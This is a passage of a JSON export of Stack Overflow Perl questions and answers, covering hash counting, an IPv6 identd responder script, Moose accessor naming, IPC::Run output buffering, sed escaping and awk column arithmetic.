files.</p>\n\n<p>Below is the example  of data and the name of each value , if the value is 1 then in hash key value will get incremented by 1 </p>\n\n<pre><code>A B C D E F G    H       I\n===========================\n0|0|0|1|0|0|ABC|15:44:07|0\n0|0|0|1|0|0|ABC|15:44:07|0\n0|0|0|0|0|0|ABC|15:44:07|0\n0|1|0|0|0|1|ABC|15:44:07|0\n</code></pre>\n\n<p>So final out put will be like below :</p>\n\n<pre><code>$finalHash-&gt;{D} = 2;\n$finalHash-&gt;{F} = 1;\n$finalHash-&gt;{B} = 1;\n</code></pre>\n\n<p>I am able to read the file line by line :</p>\n\n<pre><code> my $final_hash;\n for my $line ( &lt;$ifh&gt; ) {\n\n    my @el = split( /\\|/, $line );\n\n    #Now here have to set the value in the hashkey where we will get the 1 value\n\n\n  }\n</code></pre>\n"}, {"tags": ["perl"], "answers": [{"comments": [{"owner": {"reputation": 27, "user_id": 1777125, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/566ea50da384d02d0fd22bb838b45f98?s=128&d=identicon&r=PG", "display_name": "mojo", "link": "https://stackoverflow.com/users/1777125/mojo"}, "edited": false, "score": 0, "creation_date": 1520606963, "post_id": 49196071, "comment_id": 85397407, "body": "that is true tcp6       0      0 ::1:113                 :::*                    LISTEN      7777/perl"}], "tags": [], "owner": {"reputation": 1432, "user_id": 1184912, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cc5f9407e5093fbd916ea4d80c7a499f?s=128&d=identicon&r=PG", "display_name": "eyevan", "link": "https://stackoverflow.com/users/1184912/eyevan"}, "is_accepted": false, "score": 2, "last_activity_date": 1520606290, "creation_date": 1520606290, "answer_id": 49196071, "question_id": 49195354, "link": "https://stackoverflow.com/questions/49195354/have-the-fakeidentd-pl-script-listen-on-both-ipv4-and-ipv6/49196071#49196071", "title": "have the fakeidentd.pl script listen on both ipv4 and ipv6", "body": "<p>The following seems to work:</p>\n\n<pre><code>$socket = IO::Socket::IP-&gt;new(\n        Domain    =&gt; PF_INET6,\n        LocalHost =&gt; \"::1\",\n        \"Proto\" =&gt; \"tcp\",\n        \"LocalPort\" =&gt; 113,\n        Reuse =&gt; 1,\n        \"Listen\" =&gt; 1) or die \"Error: $!\\n\";\n</code></pre>\n\n<p>Result:</p>\n\n<pre><code># netstat -alpn | grep perl\ntcp        0      0 ::1:113                 :::*                    LISTEN      1357/perl\n</code></pre>\n"}], "owner": {"reputation": 27, "user_id": 1777125, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/566ea50da384d02d0fd22bb838b45f98?s=128&d=identicon&r=PG", "display_name": "mojo", "link": "https://stackoverflow.com/users/1777125/mojo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 65, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1520606290, "creation_date": 1520603716, "question_id": 49195354, "link": "https://stackoverflow.com/questions/49195354/have-the-fakeidentd-pl-script-listen-on-both-ipv4-and-ipv6", "title": "have the fakeidentd.pl script listen on both ipv4 and ipv6", "body": "<p>I'm trying to update a perl script that acts as identd, to also listen on an ipv6 socket.</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse IO::Socket;\nuse IO::Socket::IP;\n\nmy($client,$socket);\nif (!defined($ARGV[0])) { die \"Please supply ident\\n\"; }\nmy $ident=$ARGV[0];\n$socket = IO::Socket::IP-&gt;new(\n        \"Domain\" =&gt; \"PF_INET6\",\n        \"Proto\" =&gt; \"tcp\",\n        \"LocalPort\" =&gt; 113,\n        Reuse =&gt; 1,\n        \"Listen\" =&gt; 1) or die \"Error: $!\\n\";\nprint \"using ident: $ident\\n\";\nwhile ($client=$socket-&gt;accept()) {\n        my $host=$client-&gt;peerhost();\n        print \"connection: \", $host . \"\\n\";\n        my $data = &lt;$client&gt;;\n        if ($data) {\n                print \"$host recv: $data\\n\";\n                $data =~ s/^\\s+//;\n                $data =~ s/\\s+$//;\n                $ident =~ s/^\\s+//;\n                $ident =~ s/\\s+$//;\n                print $client \"$data : USERID : UNIX : $ident\\n\";\n                close $client;\n        }\n}\nundef $client if $client;\n</code></pre>\n\n<p>results are not satisfying at all:</p>\n\n<blockquote>\n  <p>netstat -alpn | grep perl<br>\n  tcp        0      0 0.0.0.0:113             0.0.0.0:*               LISTEN</p>\n</blockquote>\n"}, {"tags": ["perl", "moose"], "answers": [{"tags": [], "owner": {"reputation": 6566, "user_id": 748019, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/939cc882ebaf28150d4f716b933d5960?s=128&d=identicon&r=PG", "display_name": "stevenl", "link": "https://stackoverflow.com/users/748019/stevenl"}, "is_accepted": true, "score": 1, "last_activity_date": 1520608330, "creation_date": 1520608330, "answer_id": 49196739, "question_id": 49195151, "link": "https://stackoverflow.com/questions/49195151/default-naming-conventions-moose-perl/49196739#49196739", "title": "&quot;default naming conventions&quot; moose perl", "body": "<p>That line is referring to the following section of the MooseX page: <a href=\"https://metacpan.org/pod/distribution/Moose/lib/Moose/Manual/MooseX.pod#MooseX::FollowPBP\" rel=\"nofollow noreferrer\">https://metacpan.org/pod/distribution/Moose/lib/Moose/Manual/MooseX.pod#MooseX::FollowPBP</a>. (Note that the next section on <code>MooseX::SemiAffordanceAccessor</code> has an alternative option.)</p>\n\n<p>Essentially, all you need to do is add <code>use MooseX::FollowPBP</code> to your imports.</p>\n\n<p>See the actual module's documentation for more information: <a href=\"https://metacpan.org/pod/MooseX::FollowPBP\" rel=\"nofollow noreferrer\">https://metacpan.org/pod/MooseX::FollowPBP</a></p>\n"}], "owner": {"reputation": 56, "user_id": 2336392, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c072e048a831acd3da58c21a071aa6d9?s=128&d=identicon&r=PG", "display_name": "Goffredo Bosco", "link": "https://stackoverflow.com/users/2336392/goffredo-bosco"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 65, "favorite_count": 0, "accepted_answer_id": 49196739, "answer_count": 1, "score": 1, "last_activity_date": 1522859732, "creation_date": 1520603016, "last_edit_date": 1522859732, "question_id": 49195151, "link": "https://stackoverflow.com/questions/49195151/default-naming-conventions-moose-perl", "title": "&quot;default naming conventions&quot; moose perl", "body": "<p>In the moose manual it gives examples on how to change the accessor names e.g.</p>\n\n<pre><code>reader =&gt; get_myvariable,\nwriter =&gt; set_myvariable,\n</code></pre>\n\n<p>and then it states:</p>\n\n<blockquote>\n  <p>If you're thinking that doing this over and over would be insanely\n  tedious, you're right! Fortunately, Moose provides a powerful\n  extension system that lets you override the default naming\n  conventions. See Moose::Manual::MooseX for more details.</p>\n</blockquote>\n\n<p>I was browsing through the MooseX manual but couldn't locate the documentation on this. Is anyone familiar with this and could point me to the right part of the manual?</p>\n"}, {"tags": ["perl", "flush", "perl-ipc-run"], "comments": [{"owner": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "edited": false, "score": 0, "creation_date": 1520602053, "post_id": 49194665, "comment_id": 85394357, "body": "Please show the executable; that&#39;s the place that needs to skip buffering."}, {"owner": {"reputation": 109, "user_id": 4255834, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/31da357b5bc58c73b14b5580f6fd9d22?s=128&d=identicon&r=PG", "display_name": "uldics", "link": "https://stackoverflow.com/users/4255834/uldics"}, "reply_to_user": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "edited": false, "score": 0, "creation_date": 1520602408, "post_id": 49194665, "comment_id": 85394582, "body": "The binary executable is a very unmodifable proprietary software. When it is run from bash, it gives lines one by one when they are computed, almost from start of it to the finish, continuously. But this Perl, when run from cron, and running the executable it only gets the output of that executable in big batches. Also when run with system(@executableAndParameters)."}, {"owner": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "edited": false, "score": 2, "creation_date": 1520603013, "post_id": 49194665, "comment_id": 85394975, "body": "<a href=\"https://stackoverflow.com/questions/1401002/trick-an-application-into-thinking-its-stdout-is-a-terminal-not-a-pipe\" title=\"trick an application into thinking its stdout is a terminal not a pipe\">stackoverflow.com/questions/1401002/&hellip;</a> <a href=\"https://unix.stackexchange.com/questions/249723/how-to-trick-a-command-into-thinking-its-output-is-going-to-a-terminal\" title=\"how to trick a command into thinking its output is going to a terminal\">unix.stackexchange.com/questions/249723/&hellip;</a>"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1520616842, "post_id": 49194665, "comment_id": 85403358, "body": "Re &quot;<i>Is it possible to somehow flush the output like we can on the grep command with <code>grep --line-buffered</code>?</i>&quot;, How could we know if if you&#39;re not going to name the program? Is it even written in Perl?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1520616959, "post_id": 49194665, "comment_id": 85403416, "body": "See <code>&gt;pty&gt;</code> and <code>&lt;pty&lt;</code> in IPC::Run&#39;s docs to try to fool the program."}], "answers": [{"tags": [], "owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "is_accepted": false, "score": 2, "last_activity_date": 1520684814, "creation_date": 1520684814, "answer_id": 49209076, "question_id": 49194665, "link": "https://stackoverflow.com/questions/49194665/make-perl-ipcrun-pump-each-line-not-occasional-batches/49209076#49209076", "title": "Make Perl IPC::Run pump each line, not occasional batches", "body": "<p>You can use <a href=\"https://metacpan.org/pod/IPC::Run\" rel=\"nofollow noreferrer\"><code>IPC::Run</code></a>'s <code>new_chunker</code> to have it give you output on a line-by-line basis:</p>\n\n<pre><code>use warnings;\nuse strict;\nuse IPC::Run qw/ start new_chunker /;\nuse Data::Dump;\n\nmy $run = start ['perl','-le','print \"a\" x $_ for 1..180'],\n    '&gt;', new_chunker, \\my $out, '2&gt;', new_chunker, \\my $err;\nwhile (1) {\n    $run-&gt;pump;\n    last unless defined $out || defined $err;\n    dd $out, $err;\n    ($out,$err) = ();\n}\n$run-&gt;finish;\n</code></pre>\n\n<p>It's still possible that the external program won't output on a line-by-line basis, in which case, at least on *NIX, changing the first <code>'&gt;'</code> into <code>'&gt;pty&gt;'</code> (as suggested by @ikegami in the comments) will hopefully help; or one of the links provided by @daxim.</p>\n"}], "owner": {"reputation": 109, "user_id": 4255834, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/31da357b5bc58c73b14b5580f6fd9d22?s=128&d=identicon&r=PG", "display_name": "uldics", "link": "https://stackoverflow.com/users/4255834/uldics"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 332, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1520684814, "creation_date": 1520601411, "question_id": 49194665, "link": "https://stackoverflow.com/questions/49194665/make-perl-ipcrun-pump-each-line-not-occasional-batches", "title": "Make Perl IPC::Run pump each line, not occasional batches", "body": "<p>I use IPC::Run to get output from an external executable in a cron run script. I need it to be able to filter and make decisions based on the output on the fly. But the problem is it gives me output not on the fly, but in few batches - many lines at once, only after the executable has been run for a while. Is it possible to somehow flush the output like we can on the grep command with <code>grep --line-buffered</code>? I do not see this properly answered in all the Perl sites. Here is my script part:</p>\n\n<pre><code>use IPC::Run qw( start pump finish );\n...\nmy $externalExecRun = start \\@executableAndParameters, \\undef, \\$executableStdout, \\$executableStderr ;\nwhile (42) {\n    pump $externalExecRun;\n    if ($executableStdout eq '' and $engineStderr eq '') {last;}\n    WriteToLog(\"\\$executableStdout: --&gt;$executableStdout&lt;--\");              #This writes many lines at once\n    WriteToLog(\"\\$executableStderr: --&gt;$executableStderr&lt;--\");\n    $executableStdout = \"\";\n    $executableStderr = \"\";\n}\nfinish $externalExecRun;\n</code></pre>\n"}, {"tags": ["shell", "perl", "file"], "answers": [{"comments": [{"owner": {"reputation": 59, "user_id": 8371453, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-h7kAMk_gYLk/AAAAAAAAAAI/AAAAAAAANLA/RJmnCQo5ajE/photo.jpg?sz=128", "display_name": "Prabu M", "link": "https://stackoverflow.com/users/8371453/prabu-m"}, "edited": false, "score": 0, "creation_date": 1520591142, "post_id": 49191007, "comment_id": 85388132, "body": "thank u @jack the Random, i was breaking my mind for this ...."}, {"owner": {"reputation": 1432, "user_id": 1184912, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cc5f9407e5093fbd916ea4d80c7a499f?s=128&d=identicon&r=PG", "display_name": "eyevan", "link": "https://stackoverflow.com/users/1184912/eyevan"}, "reply_to_user": {"reputation": 59, "user_id": 8371453, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-h7kAMk_gYLk/AAAAAAAAAAI/AAAAAAAANLA/RJmnCQo5ajE/photo.jpg?sz=128", "display_name": "Prabu M", "link": "https://stackoverflow.com/users/8371453/prabu-m"}, "edited": false, "score": 0, "creation_date": 1520592154, "post_id": 49191007, "comment_id": 85388756, "body": "@PrabuM please accept the answer if that solves your issue."}], "tags": [], "owner": {"reputation": 1432, "user_id": 1184912, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cc5f9407e5093fbd916ea4d80c7a499f?s=128&d=identicon&r=PG", "display_name": "eyevan", "link": "https://stackoverflow.com/users/1184912/eyevan"}, "is_accepted": true, "score": 3, "last_activity_date": 1520589247, "creation_date": 1520589247, "answer_id": 49191007, "question_id": 49190831, "link": "https://stackoverflow.com/questions/49190831/how-to-replace-a-line-in-the-shell-script-that-contains-special-characters-eg/49191007#49191007", "title": "how to replace a line in the shell script that contains special characters (eg) URL", "body": "<p>You are using forward slash (<code>/</code>) as a delimiter. You also have slashes in the URL (<code>http://</code> part).\nYou need to escape slashes that are part of the string pattern you are matching:</p>\n\n<pre><code>sed -i 's/gadgets.url=http:\\/\\/gadgets.abc.com/gadgets.url=http:\\/\\/gadjets-ubuntu2.csez.abccorpin.com:8989/g' test/cm-system.properties\n</code></pre>\n\n<p>Or you could use a different delimiter instead of <code>/</code>, e.g. <code>!</code>:</p>\n\n<pre><code>sed -i 's!gadgets.url=http://gadgets.abc.com!gadgets.url=http://gadjets-ubuntu2.csez.abccorpin.com:8989!g' test/cm-system.properties\n</code></pre>\n"}], "owner": {"reputation": 59, "user_id": 8371453, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-h7kAMk_gYLk/AAAAAAAAAAI/AAAAAAAANLA/RJmnCQo5ajE/photo.jpg?sz=128", "display_name": "Prabu M", "link": "https://stackoverflow.com/users/8371453/prabu-m"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 48, "favorite_count": 0, "closed_date": 1520589341, "accepted_answer_id": 49191007, "answer_count": 1, "score": 0, "last_activity_date": 1520589247, "creation_date": 1520588705, "question_id": 49190831, "link": "https://stackoverflow.com/questions/49190831/how-to-replace-a-line-in-the-shell-script-that-contains-special-characters-eg", "closed_reason": "Duplicate", "title": "how to replace a line in the shell script that contains special characters (eg) URL", "body": "<p>I want write shell script to replace a line in the the file and that lines contains special characters (i.e) it contains URL. I tried following approaches</p>\n\n<pre><code>sed -i 's/gadgets.url=http://gadgets.abc.com/gadgets.url=http://gadjets-ubuntu2.csez.abccorpin.com:8989/g' test/cm-system.properties\n\nperl -0777 -pi -e 's/gadgets.url=http://gadgets.zoho.com/gadgets.url=http://gadjets-ubuntu2.csez.zohocorpin.com:8989/g' test/cm-system.properties\n</code></pre>\n\n<p>I tried using escape sequence also()\nstill i cant get it</p>\n"}, {"tags": ["perl", "awk"], "comments": [{"owner": {"reputation": 95936, "user_id": 5866580, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/1de2cd722d865edac1575102a48ecc0a?s=128&d=identicon&r=PG&f=1", "display_name": "RavinderSingh13", "link": "https://stackoverflow.com/users/5866580/ravindersingh13"}, "edited": false, "score": 0, "creation_date": 1520587589, "post_id": 49190397, "comment_id": 85385949, "body": "Your shown examples are NOT clear, please mention more clear examples in your post."}, {"owner": {"reputation": 226874, "user_id": 1983854, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/eKpAk.png?s=128&g=1", "display_name": "fedorqui &#39;SO stop harming&#39;", "link": "https://stackoverflow.com/users/1983854/fedorqui-so-stop-harming"}, "edited": false, "score": 1, "creation_date": 1520587655, "post_id": 49190397, "comment_id": 85385986, "body": "please show what you tried"}, {"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 1, "creation_date": 1520588704, "post_id": 49190397, "comment_id": 85386551, "body": "This still doesn&#39;t look any clearer than your attempt at asking this yesterday <a href=\"https://stackoverflow.com/questions/49169847/how-to-subtract-a-value-with-a-column-of-values\" title=\"how to subtract a value with a column of values\">stackoverflow.com/questions/49169847/&hellip;</a>"}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "reply_to_user": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1520590177, "post_id": 49190397, "comment_id": 85387514, "body": "@Chris: The question is slightly different: yesterday we were asked to do math with <i>one</i> column in <i>two</i> files, today it is <i>two</i> columns in <i>one</i> file."}, {"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 1, "creation_date": 1520593733, "post_id": 49190397, "comment_id": 85389631, "body": "@PerlDuck however the data is stored, neither of them were very clear questions"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1520596134, "post_id": 49190397, "comment_id": 85390877, "body": "Don&#39;t repost questions! Youi posted the exactly same question yesterday (hence closure as dupe). This is against site-rules."}, {"owner": {"reputation": 44559, "user_id": 411022, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9905bf9a7b8d5a587c1bdff07ef2e801?s=128&d=identicon&r=PG", "display_name": "Ilmari Karonen", "link": "https://stackoverflow.com/users/411022/ilmari-karonen"}, "reply_to_user": {"reputation": 226874, "user_id": 1983854, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/eKpAk.png?s=128&g=1", "display_name": "fedorqui &#39;SO stop harming&#39;", "link": "https://stackoverflow.com/users/1983854/fedorqui-so-stop-harming"}, "edited": false, "score": 0, "creation_date": 1522007856, "post_id": 49190397, "comment_id": 85963497, "body": "@fedorqui: FYI, the question you closed this as a dupe of is gone now."}, {"owner": {"reputation": 226874, "user_id": 1983854, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/eKpAk.png?s=128&g=1", "display_name": "fedorqui &#39;SO stop harming&#39;", "link": "https://stackoverflow.com/users/1983854/fedorqui-so-stop-harming"}, "reply_to_user": {"reputation": 44559, "user_id": 411022, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9905bf9a7b8d5a587c1bdff07ef2e801?s=128&d=identicon&r=PG", "display_name": "Ilmari Karonen", "link": "https://stackoverflow.com/users/411022/ilmari-karonen"}, "edited": false, "score": 0, "creation_date": 1522016238, "post_id": 49190397, "comment_id": 85965891, "body": "@IlmariKaronen oh, that&#39;s a weirdy, edge case your SOUP may have encountered! Reopening then, thanks for the heads up"}, {"owner": {"reputation": 44559, "user_id": 411022, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9905bf9a7b8d5a587c1bdff07ef2e801?s=128&d=identicon&r=PG", "display_name": "Ilmari Karonen", "link": "https://stackoverflow.com/users/411022/ilmari-karonen"}, "reply_to_user": {"reputation": 226874, "user_id": 1983854, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/eKpAk.png?s=128&g=1", "display_name": "fedorqui &#39;SO stop harming&#39;", "link": "https://stackoverflow.com/users/1983854/fedorqui-so-stop-harming"}, "edited": false, "score": 0, "creation_date": 1522016334, "post_id": 49190397, "comment_id": 85965917, "body": "@fedorqui: Thanks! <a href=\"https://data.stackexchange.com/stackoverflow/query/209965/duplicates-of-deleted-questions\" rel=\"nofollow noreferrer\">I&#39;ve got almost 1600 more</a>, if you feel like lending a hand. :)"}], "answers": [{"comments": [{"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1520592363, "post_id": 49190629, "comment_id": 85388859, "body": "This is actually an answer to <a href=\"https://stackoverflow.com/q/49169847/5830574\">yesterday&#39;s question</a>, not to the current one. The current question deals with two columns in one file, i.e. there is no file1 and file2."}, {"owner": {"reputation": 39446, "user_id": 4301306, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7a1461d0104809c90e2a252a2d4b0ef9?s=128&d=identicon&r=PG&f=1", "display_name": "Wintermute", "link": "https://stackoverflow.com/users/4301306/wintermute"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 1, "creation_date": 1520629740, "post_id": 49190629, "comment_id": 85409616, "body": "@PerlDuck The question was edited after the answer was posted. Since OP accepted the answer, I suspect the edit was erroneous, but I suppose I&#39;ll add something for it."}], "tags": [], "owner": {"reputation": 39446, "user_id": 4301306, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7a1461d0104809c90e2a252a2d4b0ef9?s=128&d=identicon&r=PG&f=1", "display_name": "Wintermute", "link": "https://stackoverflow.com/users/4301306/wintermute"}, "is_accepted": true, "score": 2, "last_activity_date": 1520630510, "last_edit_date": 1520630510, "creation_date": 1520588065, "answer_id": 49190629, "question_id": 49190397, "link": "https://stackoverflow.com/questions/49190397/how-to-subtract-a-column-of-values-with-another-column-of-values/49190629#49190629", "title": "How to subtract a column of values with another column of values?", "body": "<p>If I understand this correctly, then</p>\n\n<pre><code>awk 'NR == FNR { src[FNR] = $1; next } { for(i = 1; i &lt;= length(src); ++i) { printf(\"%d\\t\", src[i] - $1); } print \"\"; }' file2 file1\n</code></pre>\n\n<p>produces the desired output. This works as follows:</p>\n\n<pre><code>NR == FNR {                             # while the first file (file2) is read:\n  src[FNR] = $1                         # remember the numbers in an array\n  next                                  # and we're done\n}\n{                                       # after that (when processing file1):\n  for(i = 1; i &lt;= length(src); ++i) {   # loop through the saved numbers\n    printf(\"%d\\t\", src[i] - $1)         # subtract the current number from it,\n                                        # print result followed by tab\n  }\n  print \"\"                              # when done, print a newline\n}\n</code></pre>\n\n<p><strong>EDIT:</strong> Since the question was edited to use one file with two columns instead of two with one each: The code can be slightly tweaked for that scenario as follows:</p>\n\n<pre><code>awk 'NR == FNR &amp;&amp; NF &gt; 1 { src[FNR] = $2 } NR != FNR &amp;&amp; $1 != \"\" { for(i = 1; i &lt;= length(src); ++i) { printf(\"%d\\t\", src[i] - $1); } print \"\"; }' file file\n</code></pre>\n\n<p>This follows the same basic pattern: Two passes are done over the file, one in which the numbers of the second column are saved and another in which the output is calculated and printed. The main addition is handling for empty fields:</p>\n\n<pre><code>NR == FNR &amp;&amp; NF &gt; 1 {                    # If this is the first pass and there is\n  src[FNR] = $2                          # a second field, remember it\n}\nNR != FNR &amp;&amp; $1 != \"\" {                  # If this is the second pass and there is\n  for(i = 1; i &lt;= length(src); ++i) {    # a first field, process it as before.\n    printf(\"%d\\t\", src[i] - $1)\n  }\n  print \"\"\n}\n</code></pre>\n\n<p>Alternatively, it could be done in one pass as follows:</p>\n\n<pre><code>awk '$1 != \"\" { a[NR] = $1 } NF &gt; 1 { b[NR] = $2 } END { for(i = 1; i &lt;= length(b); ++i) { for(j = 1; j &lt;= length(a); ++j) { printf(\"%d\\t\", b[i] - a[j]) } print \"\" } }' file\n</code></pre>\n\n<p>That is:</p>\n\n<pre><code>$1 != \"\" { a[NR] = $1 }                # If there is a first field, remember it\nNF &gt; 1   { b[NR] = $2 }                # If there is a second field, remember it\nEND {                                  # After reaching the end of the file,\n  for(i = 1; i &lt;= length(b); ++i) {    # process the saved data as before.\n    for(j = 1; j &lt;= length(a); ++j) {\n      printf(\"%d\\t\", b[i] - a[j])\n    }\n    print \"\"\n  }\n}\n</code></pre>\n"}], "owner": {"reputation": 25, "user_id": 9460698, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27e012cb7ac752af8c6c25c9af0d971c?s=128&d=identicon&r=PG&f=1", "display_name": "Y. Du", "link": "https://stackoverflow.com/users/9460698/y-du"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 93, "favorite_count": 0, "accepted_answer_id": 49190629, "answer_count": 1, "score": -2, "last_activity_date": 1522016241, "creation_date": 1520587256, "last_edit_date": 1520595994, "question_id": 49190397, "link": "https://stackoverflow.com/questions/49190397/how-to-subtract-a-column-of-values-with-another-column-of-values", "title": "How to subtract a column of values with another column of values?", "body": "<p>I have two files with one column of values, like attachments below. I want to subtract the first value of file2 with all values in file1, these subtractions fill the first column in the output file, and then second value of file2 with all values in file1 ...</p>\n\n<p>The output would look like this:</p>\n\n<pre><code> -4(2-6)    -5    0    1\n  0(2-2)    -1    4    5\n -2(2-4)    -3    2    3\n -3(2-5)    -4    1    2\n -6(2-8)    -7   -2   -1\n</code></pre>\n\n<p>Expressions in brackets in first column are only for explanation use and need to be discarded in output. </p>\n\n<p>Also, the number of values in the column can vary.</p>\n\n<p>Many thanks!</p>\n\n<pre><code>file1        file2\n\n   6           2          \n   2           1          \n   4           6          \n   5           7          \n   8                      \n</code></pre>\n"}, {"tags": ["perl", "sockets", "tcp"], "comments": [{"owner": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 1, "creation_date": 1520584854, "post_id": 49189467, "comment_id": 85384483, "body": "This is similar to chat server; perhaps picking some that already exists (Mojolicious?) rather than reinventing the wheel unless it is for educational purposes."}, {"owner": {"reputation": 125, "user_id": 1934262, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/4ceac2ce6ef515945bd020498a10d5dd?s=128&d=identicon&r=PG", "display_name": "sparco1500", "link": "https://stackoverflow.com/users/1934262/sparco1500"}, "reply_to_user": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 0, "creation_date": 1520638398, "post_id": 49189467, "comment_id": 85412837, "body": "thanks, but I&#39;ve already looked at several chat server implementations , but they didn&#39;t answer the questions I had.  As usual, when learning something a trivial example is often needed to begin with before it can be applied to more complex cases. :) but thankyou for the response anyhow."}], "answers": [{"comments": [{"owner": {"reputation": 125, "user_id": 1934262, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/4ceac2ce6ef515945bd020498a10d5dd?s=128&d=identicon&r=PG", "display_name": "sparco1500", "link": "https://stackoverflow.com/users/1934262/sparco1500"}, 